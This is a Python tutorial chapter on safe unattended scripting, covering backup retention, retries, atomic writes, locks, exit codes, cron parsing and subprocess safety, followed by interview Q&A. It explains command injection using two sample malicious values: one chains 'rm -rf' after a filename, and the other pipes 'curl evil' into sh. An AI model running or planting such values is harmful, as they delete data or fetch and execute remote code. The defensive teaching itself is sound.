Every system that produces files (logs, backups, build artifacts, snapshots) eventually needs a rule for deleting them, and that rule is the most dangerous code in the whole script. Three design decisions keep it safe. One: compute a plan (what to keep, what to delete) as a pure function, and only then act on it — that makes a dry-run trivial. Two: never call datetime.now() inside the logic; pass now in. The function becomes deterministic, unit-testable at any date, and you can replay "what would have been deleted last Tuesday." Three: combine an age rule with a count rule — keep anything newer than N days or among the newest K. The count rule is the seatbelt.

A pure retention planner (age OR newest-K)
import re from datetime import datetime, timedelta, timezone NOW = datetime(2025, 3, 15, 12, 0, tzinfo=timezone.utc) # injected clock: never call now() inside the logic def backup_date(name): m = re.search(r'(\d{4}-\d{2}-\d{2})', name) return datetime.strptime(m.group(1), '%Y-%m-%d').replace(tzinfo=timezone.utc) def plan_retention(names, now, keep_days, keep_last): newest_first = sorted(names, key=backup_date, reverse=True) cutoff = now - timedelta(days=keep_days) keep, delete = [], [] for i, name in enumerate(newest_first): if i < keep_last or backup_date(name) >= cutoff: keep.append(name) else: delete.append(name) return keep, delete names = ['db-2025-03-14.sql.gz', 'db-2025-03-13.sql.gz', 'db-2025-03-12.sql.gz', 'db-2025-03-05.sql.gz', 'db-2025-02-20.sql.gz', 'db-2025-01-01.sql.gz'] keep, delete = plan_retention(names, NOW, keep_days=7, keep_last=2) print('keep :', keep) print('delete:', delete) stalled = ['db-2025-01-01.sql.gz', 'db-2024-12-31.sql.gz', 'db-2024-12-30.sql.gz'] # backup job broke in January keep, delete = plan_retention(stalled, NOW, keep_days=7, keep_last=2) print('stalled job still keeps:', keep)
⚠️
Why "newest K" matters. Look at the second call: the backup job broke in January, so by March every backup is older than 7 days. A pure age rule would delete them all — and you would discover the outage only when you needed a restore. Keeping the newest K regardless of age turns "silently deleted our last good backup" into "kept two stale ones, and monitoring should already be screaming that the newest is 2 months old."
3.5 — Retries With Exponential Backoff and Jitter

Networks and APIs fail transiently: a connection reset, a 503 during a deploy, a rate-limit response. A retry turns most of those into non-events — but a naive retry (while True: try again immediately) is one of the most reliable ways to turn a small outage into a big one. The standard recipe has four parts. Bounded attempts (a budget, not infinity). Exponential backoff: wait 1s, 2s, 4s, 8s… so a struggling service gets breathing room, capped at a max_delay. Jitter: randomize each wait so a thousand clients that failed together don't all retry together (the thundering herd). And selectivity: retry only errors that can plausibly succeed next time (ConnectionError, TimeoutError, HTTP 429/502/503/504) — never a ValueError or a 400/404, because a malformed request stays malformed.

A retry decorator with injected sleep and jitter
import functools, time def retry(max_attempts=4, base_delay=1.0, factor=2.0, max_delay=30.0, jitter=lambda cap: cap, sleep=None, retry_on=(ConnectionError, TimeoutError)): sleep = sleep or time.sleep def decorator(fn): @functools.wraps(fn) def wrapper(*args, **kwargs): for attempt in range(max_attempts): try: return fn(*args, **kwargs) except retry_on: if attempt == max_attempts - 1: raise # budget spent: surface the real error cap = min(max_delay, base_delay * factor ** attempt) sleep(jitter(cap)) return wrapper return decorator delays, calls = [], {'n': 0} @retry(max_attempts=4, base_delay=1.0, jitter=lambda cap: cap / 2, sleep=delays.append) def flaky(): calls['n'] += 1 if calls['n'] < 3: raise ConnectionError('connection reset by peer') return 'ok' print(flaky(), 'after', calls['n'], 'calls; slept', delays) @retry(sleep=delays.append) def bad_input(): raise ValueError('malformed payload') # a bug in the request will not fix itself: no retry try: bad_input() except ValueError as e: print('not retried:', e)

Notice the two injection points, sleep and jitter. In production they default to time.sleep and a random function; in a test you pass delays.append and a fixed function, so the test runs instantly and asserts the exact schedule. Code that hard-wires time.sleep(random.uniform(...)) can only be tested by waiting. The common production jitter is full jitter: random.uniform(0, cap) — sleep anywhere from zero to the backoff cap — which spreads retries most evenly.

🚫
Only retry what is safe to repeat. If the request might have succeeded before the connection dropped, retrying a non-idempotent call (POST /charge, "send email", "increment counter") can double-apply it. Either retry only idempotent operations (GET, PUT, DELETE by id), or attach an idempotency key so the server can recognize a repeat. Also set a per-attempt timeout: a retry loop around a call that can hang forever never gets to retry.
3.6 — Idempotency, Atomic Writes and Locks

A script is idempotent if running it twice leaves the system in the same state as running it once. It is the property that makes automation safe to re-run after a crash, safe to schedule aggressively, and safe for a nervous human to run "just to be sure." You get it by describing the desired end state rather than the action: "ensure this line is in the file", not "append this line"; "ensure the directory exists", not "create the directory." The second half of the safety story is atomic writes: if a script crashes halfway through writing a config file, or a reader opens it mid-write, they see a truncated file. Write the new content to a temp file in the same directory, then os.replace() it into place — a single atomic rename, so readers see either the complete old file or the complete new one.

ensure_line: idempotent and atomic
import os, tempfile from pathlib import Path def atomic_write(path, text): path = Path(path) tmp = path.with_name(path.name + '.tmp') tmp.write_text(text) os.replace(tmp, path) # atomic on one filesystem: readers see the old file or the new one, never half def ensure_line(path, line): path = Path(path) lines = path.read_text().splitlines() if path.exists() else [] if line in lines: return False # already correct -> do nothing (idempotent) atomic_write(path, '\n'.join(lines + [line]) + '\n') return True d = Path(tempfile.mkdtemp()) hosts = d / 'hosts.txt' print(ensure_line(hosts, '10.0.0.5 db01')) # True -> changed something print(ensure_line(hosts, '10.0.0.5 db01')) # False -> second run is a no-op print(ensure_line(hosts, '10.0.0.6 db02')) print(hosts.read_text(), end='') print(sorted(p.name for p in d.iterdir())) # no leftover .tmp file

The last piece is stopping two copies of the script running at once — cron fires while the previous run is still going, or two engineers run it together. A lock serializes them. The simplest portable lock is a file created with the exclusive-create flag: open(path, 'x') succeeds for exactly one caller and raises FileExistsError for everyone else. Wrap it in a context manager so it is always released, even when the body raises.

A file lock as a context manager
import tempfile from pathlib import Path class LockHeld(Exception): pass class FileLock: def __init__(self, path): self.path = Path(path) def __enter__(self): try: self.path.open('x').close() # 'x' = create exclusively; fails if the file exists except FileExistsError: raise LockHeld(f'{self.path.name} is held by another run') from None return self def __exit__(self, *exc): self.path.unlink(missing_ok=True) # always release, even if the body raised return False d = Path(tempfile.mkdtemp()) with FileLock(d / 'janitor.lock'): try: with FileLock(d / 'janitor.lock'): print('this must never print') except LockHeld as e: print('second run refused:', e) print('lock released:', not (d / 'janitor.lock').exists())
⚠️
Stale locks. A file lock survives a kill -9 or a power loss, so the next run is locked out forever. Real tools store the owner PID (and check it is still alive), set a lock timeout, or use OS-level advisory locks (fcntl.flock) that the kernel releases automatically when the process dies. os.replace() is atomic only within one filesystem — that's why the temp file lives next to its destination, not in /tmp.
3.7 — Exit Codes, argparse Subcommands and Structured Logging

When your script runs under cron, a CI job, a Kubernetes Job or a systemd unit, nobody reads its output — the scheduler looks at the exit code. Zero means success; anything else means failure, and the platform reacts (retry, alert, mark the pipeline red). So a script that prints "ERROR: backup failed" and then exits 0 has told a human but lied to the machine. The conventions: 0 success, 1 general failure, 2 usage error (which argparse uses for you), 128+N "killed by signal N" (137 = SIGKILL, 143 = SIGTERM). The pattern that makes this testable is a main(argv=None) -> int function that returns the code, called as sys.exit(main()) only at the very bottom. Tests call main([...]) with an explicit argument list — no real command line needed.

argparse subcommands with an explicit argv, and honest exit codes
import argparse, contextlib, io def build_parser(): p = argparse.ArgumentParser(prog='janitor') sub = p.add_subparsers(dest='command', required=True) plan = sub.add_parser('plan', help='show what would be deleted') plan.add_argument('--dir', required=True) plan.add_argument('--keep-days', type=int, default=7) plan.add_argument('--keep-last', type=int, default=3) run = sub.add_parser('run', help='actually delete') run.add_argument('--dir', required=True) run.add_argument('--yes', action='store_true', help='required to really delete') return p def main(argv=None): try: args = build_parser().parse_args(argv) except SystemExit as e: return e.code # argparse exits with 2 on bad usage print('command =', args.command, '| dir =', args.dir) return 0 print('exit code:', main(['plan', '--dir', '/backups', '--keep-days', '14'])) err = io.StringIO() with contextlib.redirect_stderr(err): code = main(['run']) # forgot --dir print('exit code:', code) print(err.getvalue().strip().splitlines()[-1]) # In a real script the last line is: sys.exit(main())

Subcommands (janitor plan vs janitor run --yes) are how you keep the dangerous action behind a deliberate flag: the default command shows what would happen. Logging matters just as much in unattended scripts. Plain print lines are fine for a human; structured (JSON) logs let Loki, CloudWatch, Datadog or jq filter on fields — level == "ERROR", file == "db-2025-01-01.sql.gz" — instead of regex-ing prose.

JSON log lines with the logging module
import json, logging, sys class JsonFormatter(logging.Formatter): def format(self, record): payload = {'level': record.levelname, 'msg': record.getMessage()} payload.update(getattr(record, 'fields', {})) return json.dumps(payload, sort_keys=True) log = logging.getLogger('janitor') log.handlers.clear() # re-running this cell must not duplicate output handler = logging.StreamHandler(sys.stdout) handler.setFormatter(JsonFormatter()) log.addHandler(handler) log.setLevel(logging.INFO) log.propagate = False log.info('plan computed', extra={'fields': {'keep': 3, 'delete': 2, 'dry_run': True}}) log.error('delete failed', extra={'fields': {'file': 'db-2025-01-01.sql.gz', 'errno': 13}})
⭐
Log the decision and its inputs, never the secrets. "Deleted 5 files (keep_days=7, keep_last=2, dry_run=False)" is a log line you can debug from six months later. Tokens, passwords and connection strings should never reach a log — mask them before they get near the logger. In a real service add a timestamp field (the logging module's record.created) and a correlation/run ID so one execution's lines can be grouped.
3.8 — Cron Expressions: Knowing When Your Script Runs

Most of the scripts in this chapter run from cron or something that copies its syntax (Kubernetes CronJob, GitHub Actions schedule, CloudWatch rules). Five fields — minute hour day-of-month month day-of-week — each accepting *, a number, a list (1,15), a range (1-5), and a step (*/5, 10-50/10). Writing a matcher is the quickest way to actually understand the semantics, and it is a favorite interview exercise because it hides real gotchas: cron numbers Sunday as 0 (and also 7) while Python's weekday() starts at Monday = 0, and — the famous one — when both day-of-month and day-of-week are restricted, cron fires when either matches, not both.

A cron-expression matcher
from datetime import datetime def field_matches(field, value, lo, hi): for part in field.split(','): step, has_step = 1, '/' in part if has_step: part, step = part.split('/') step = int(step) if part == '*': start, end = lo, hi elif '-' in part: start, end = map(int, part.split('-')) else: start = int(part) end = hi if has_step else start # "5/20" means 5-hi every 20 if start <= value <= end and (value - start) % step == 0: return True return False def cron_matches(expr, dt): minute, hour, dom, month, dow = expr.split() if not (field_matches(minute, dt.minute, 0, 59) and field_matches(hour, dt.hour, 0, 23) and field_matches(month, dt.month, 1, 12)): return False cron_dow = (dt.weekday() + 1) % 7 # cron: Sunday = 0; Python: Monday = 0 dom_ok = field_matches(dom, dt.day, 1, 31) dow_ok = field_matches(dow, cron_dow, 0, 7) or (cron_dow == 0 and field_matches(dow, 7, 0, 7)) if dom != '*' and dow != '*': return dom_ok or dow_ok # BOTH restricted => OR, not AND (classic cron gotcha) return dom_ok and dow_ok cases = [ ('*/5 * * * *', datetime(2025, 3, 17, 12, 0)), # every 5 minutes ('*/5 * * * *', datetime(2025, 3, 17, 12, 3)), ('0 2 * * 1-5', datetime(2025, 3, 17, 2, 0)), # Monday 02:00 ('0 2 * * 1-5', datetime(2025, 3, 16, 2, 0)), # Sunday 02:00 ('0 0 13 * 5', datetime(2025, 6, 6, 0, 0)), # a Friday that is NOT the 13th ('0 0 13 * 5', datetime(2025, 6, 10, 0, 0)), # a Tuesday that is not the 13th ] for expr, dt in cases: print(f'{expr:<14} {dt:%a %Y-%m-%d %H:%M} -> {cron_matches(expr, dt)}')
⚠️
Read the fifth and sixth lines again. 0 0 13 * 5 reads like "midnight on Friday the 13th," but it fires on every Friday and on every 13th — the OR rule. Other operational traps: cron uses the server's local time zone (a 02:30 job vanishes or runs twice around a DST change — prefer UTC servers), a job that runs longer than its interval overlaps with itself (that's what the lock from 3.6 is for), and a missed run (machine was down) is simply skipped, not caught up.
3.9 — Running Other Programs Safely: subprocess, Signals and Parallel Host Checks

Sooner or later a script has to call git, kubectl, rsync or pg_dump. subprocess needs a real operating system, so the real calls below are reference only in this browser sandbox — but the injection problem they defend against you can demonstrate right here with shlex. The rule is simple: pass an argument list, never a shell string built from input.

What a shell would do with unsanitized input
import shlex user_input = 'backup.tar.gz; rm -rf /tmp/important' unsafe = f'ls -l {user_input}' print('shell=True would run :', unsafe) print('...parsed as :', shlex.split(unsafe)) # two commands, not one safe_string = f'ls -l {shlex.quote(user_input)}' print('with shlex.quote :', safe_string) print('...parsed as :', shlex.split(safe_string)) # one filename argument print('best: an argv list :', ['ls', '-l', user_input]) # no shell involved at all

Checking many hosts in parallel with a thread pool — reference only
from concurrent.futures import ThreadPoolExecutor, as_completed def check(host): ... # I/O bound: ssh, HTTP health check, TCP connect return host, True hosts = [f"web{n:02d}.example.internal" for n in range(1, 201)] failed = [] with ThreadPoolExecutor(max_workers=20) as pool: # bound the parallelism; don't open 200 sockets at once futures = [pool.submit(check, h) for h in hosts] for fut in as_completed(futures, timeout=120): try: host, ok = fut.result() except Exception as exc: failed.append(str(exc)) else: if not ok: failed.append(host) print(f"{len(failed)} unhealthy")
💡
Threads vs processes vs asyncio for ops work. Checking hosts, calling APIs and waiting on SSH are I/O bound: the GIL is released while a thread waits on a socket, so a thread pool (or asyncio) gives near-linear speed-ups. Compressing or hashing lots of data is CPU bound: threads don't help under the GIL, use ProcessPoolExecutor. And always reap what you start: a child launched with Popen that is never wait()ed becomes a zombie — dead, but still holding a process-table entry until its parent collects the exit status.

  • Test on a throwaway tree, and guard every delete — resolve paths and check they sit inside the allowed root before removing anything.
  • Separate the plan from the action. A pure planner with an injected now gives you dry-runs, deterministic tests and replayable history.
  • Retention = age rule OR newest-K rule. The count rule stops a broken backup job from causing a total wipe.
  • Retry transient errors only, with bounded attempts, exponential backoff, a cap and jitter — and only for operations that are safe to repeat.
  • Idempotent, atomic, locked: declare end state, write temp-then-os.replace, and serialize runs with an exclusive lock that is always released.
  • Exit codes are the API to your scheduler; structured logs are the API to your log platform. Return codes from main(), log JSON, never log secrets.
  • Cron has sharp edges: Sunday is 0 (or 7), day-of-month and day-of-week combine with OR, and schedules run in server-local time.
  • Never build shell strings from input. Use argument lists, timeouts and check=True; handle SIGTERM; reap child processes.

💼 Automation & Resilience — Interview Prep

12 questions that DevOps, SRE and platform interviewers ask about production scripting — the "how do you make this safe to run unattended?" angle. Click a question to reveal what a strong answer sounds like.

What does it mean for a script to be idempotent, and how do you make one?▶
Running it twice leaves the system in exactly the state running it once would. You get there by expressing desired end state instead of actions: mkdir(exist_ok=True), "ensure this line is present," "create the user unless it exists," UPDATE ... SET status='done' rather than counter += 1. It matters because automation gets re-run — after a crash, by a retry, by cron overlapping, by a human who isn't sure the last run finished. A strong answer names a non-idempotent trap (appending to a file, sending an email, incrementing a counter) and the fix (check-then-act under a lock, an idempotency key, or a state file recording what's already done).
What should you retry, and what should you never retry?▶
Retry transient failures: connection resets, timeouts, HTTP 429/502/503/504. Never retry errors that cannot fix themselves — 400/401/403/404, validation errors, bugs — you just repeat the failure more slowly and add load. The second axis is safety: only retry operations that are idempotent (GET, PUT, DELETE by id), or make them so with an idempotency key, because a timeout does not tell you whether the server did the work. Always bound the attempts and the total time, and put a timeout on each attempt, or the retry loop itself becomes the outage.
Why exponential backoff with jitter? What is a thundering herd?▶
Exponential backoff (1s, 2s, 4s… capped) gives a struggling dependency progressively more breathing room. Without jitter, every client that failed at the same moment retries at the same moments — synchronized waves that can keep a recovering service down. Jitter randomizes each wait so retries spread out. The usual formulation is full jitter: sleep random.uniform(0, min(cap, base * 2**attempt)). Bonus points: mention that the failure is often correlated (a deploy or a network blip hits everyone at once), which is exactly when jitter matters, and that a retry budget or circuit breaker stops retries from amplifying an outage.
Why is subprocess.run(cmd, shell=True) with user-influenced input dangerous, and how do you run commands safely?▶
With shell=True the string goes through /bin/sh, so metacharacters — ;, &&, backticks, $( ), newlines — are interpreted. A value like x; curl evil | sh becomes arbitrary command execution as your script's user. Safe pattern: pass a list (['grep', '--', pattern, path]) so there is no shell, plus check=True, timeout=... and capture_output=True. The -- stops a value that starts with - being read as an option (argument injection). If you truly need a shell, shlex.quote() every interpolated value, and never build commands from untrusted data.
How do you update a config file so a crash or a concurrent reader never sees a half-written file?▶
Write the new content to a temporary file in the same directory (same filesystem), flush and fsync it if durability matters, then os.replace(tmp, target). A rename within one filesystem is atomic on POSIX, so readers see either the complete old file or the complete new one. The same-filesystem detail is the follow-up interviewers probe: a rename across filesystems degrades to copy-then-delete and is not atomic. Also mention that atomic replace protects readers but does not serialize two writers — for that you add a lock, or a version check.
What is a zombie process and how can a Python script create one?▶
A zombie is a process that has exited but whose exit status has not been collected by its parent, so it keeps a process-table entry (state Z in ps). A script creates them by starting children with subprocess.Popen (or os.fork) and never calling wait()/communicate()/poll(). A few are harmless; thousands exhaust the PID table. Fix: use subprocess.run (waits for you), or always wait(). Long-running daemons in containers add another wrinkle — PID 1 must reap orphaned children, which is why images use an init like tini or Docker's --init.
What do exit codes mean, and why should a script return them properly?▶
Zero is success; non-zero is failure. Schedulers, CI systems, Kubernetes Jobs and systemd all key off the exit status, not your output — a script that logs "backup failed" and exits 0 is invisible to alerting. Conventions: 1 for a general error, 2 for a usage error (argparse does this), 126/127 for "not executable / not found", and 128+N when killed by signal N (137 = SIGKILL, often the OOM killer; 143 = SIGTERM). In Python: structure the script as def main(argv=None) -> int and finish with sys.exit(main()), so tests can call main([...]) and assert on the returned code.
You have to write a script that deletes old files. How do you make that safe?▶
Layers: (1) compute a plan as a pure function and default to a dry-run, requiring an explicit flag to delete; (2) only touch files that match a strict pattern, and report what was skipped rather than deleting unknown files; (3) resolve paths and verify each target is inside the intended root before unlinking; (4) combine the age rule with a keep-newest-K rule so a broken producer can't cause a total wipe; (5) inject the clock so behavior is testable; (6) log every decision with its inputs; (7) make it idempotent and lock against concurrent runs. Being able to list these unprompted is what distinguishes someone who has been paged for a cleanup script gone wrong.
How should a long-running worker handle SIGTERM, for example inside Kubernetes?▶
On pod termination Kubernetes sends SIGTERM, waits terminationGracePeriodSeconds (default 30s), then sends SIGKILL, which cannot be caught. So the handler should just set a flag; the main loop finishes the current unit of work, releases locks, flushes logs and exits 0. Do not do heavy work inside the signal handler itself (it runs between bytecodes, and only in the main thread). Related details worth naming: make the process PID 1's signal-aware (or use an init), stop accepting new work first, and use preStop hooks or readiness gating so the load balancer stops sending traffic before shutdown starts.
What are the classic cron gotchas?▶
(1) When both day-of-month and day-of-week are restricted, cron fires when either matches, so 0 0 13 * 5 runs every Friday and every 13th. (2) Time zone: cron uses the host's local time, so a 02:30 job is skipped or doubled around daylight-saving changes — run servers in UTC. (3) Overlap: a run that outlasts its interval collides with the next one; guard with a lock or concurrencyPolicy: Forbid in Kubernetes. (4) Missed runs are not replayed. (5) Sunday is 0 (and 7), and the minimal cron environment has a tiny PATH and no shell profile, so scripts that work interactively fail there — use absolute paths.
Threads, processes or asyncio for checking 500 hosts? What about compressing 500 files?▶
Checking hosts is I/O bound: the thread spends its time waiting on the network, and CPython releases the GIL while waiting, so a ThreadPoolExecutor (bounded, e.g. 20–50 workers) or asyncio gives large speed-ups; asyncio scales to more concurrent connections with less memory but needs async-aware libraries. Compressing or hashing files is CPU bound: under the GIL threads don't help, so use ProcessPoolExecutor (or multiprocessing), which sidesteps the GIL with separate interpreters. Always cap concurrency — an unbounded pool can exhaust file descriptors, trip rate limits, or hammer the very systems you're checking.
How would you find duplicate files across a very large directory tree efficiently?▶
Never hash everything up front. Stage it: (1) group by file size — a stat is cheap and files of different sizes cannot be equal; (2) for size groups with 2+ files, hash a small prefix (say the first 4 KB) to eliminate most non-matches cheaply; (3) full SHA-256 only for prefix matches, read in fixed-size chunks so memory stays constant; (4) optionally a final byte-for-byte compare before deleting anything, since the cost of a false positive is data loss. Mention hard links (same inode is not a duplicate to reclaim) and symlinks (don't follow them blindly).
